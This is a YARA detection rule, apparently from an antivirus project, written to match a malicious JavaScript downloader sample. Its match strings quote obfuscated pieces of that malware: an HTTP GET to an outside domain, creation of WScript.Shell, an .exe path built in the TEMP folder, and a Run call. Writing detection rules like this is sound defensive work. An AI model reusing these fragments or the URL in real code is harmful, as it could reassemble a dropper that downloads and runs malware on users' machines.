rule sig_20160401_7c8f605028bda759a49383fbc0deea2a {
  meta:
    description = "datamaliciousorder - file 20160401_7c8f605028bda759a49383fbc0deea2a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "44d6e4b8d3d94e8d1d0f33f2bd413b7bf98ac57e5a99f507e933f492a09f2997"

  strings:
    $s1  = "MszPd[SrvSca](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "var YjiIq = function HiqDm() {return WScript[AbPv](\"WScript\"+\".Shell\");}(), KkbHg = 11;" fullword ascii
    $s3  = "function VjfId(NjiAr, GhAq){YbiTwx = YbiTwx * 1; return NjiAr - GhAq;};" fullword ascii
    $s4  = "DoRn = \"21\" + 231 - PdsFay * DoRn; " fullword ascii
    $s5  = "if (MszPd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "function SqTr(){return YiUg + \"\";};" fullword ascii
    $s7  = "function KpmTgy() {return YjiIq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"808PVkJ6.ex\" + \"e\";};" fullword ascii
    $s8  = "function PaeDs() {return ((OhzTjq == true) && (OhzTjq == TkiSx)) ? 1 : YbiTwx;};" fullword ascii
    $s9  = "var HtkLoj = new this[\"Date\"]();" fullword ascii
    $s10 = "var DoRn = \"VhKpi\";" fullword ascii
    $s11 = "TkiSx = true; " fullword ascii
    $s12 = "var GtdJmz = false;" fullword ascii
    $s13 = "var OhzTjq = false;" fullword ascii
    $s14 = "function WgGw(LhAam) {var EvjFmd = (1, 2, 3, 4, 5, LhAam); return EvjFmd;};" fullword ascii
    $s15 = "var TkiSx = false;" fullword ascii
    $s16 = "function UlUo(VkjRhz){YjiIq[\"R\"+\"un\"](VkjRhz, YbiTwx, YbiTwx);};" fullword ascii
    $s17 = "}while (XiWqt);" fullword ascii
    $s18 = "return VjfId(PdsFay, DoRn);" fullword ascii
    $s19 = "DoRn = VjfId(WvqDtv, AhzMvc);" fullword ascii
    $s20 = "function SmfKkz(){return AbPv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}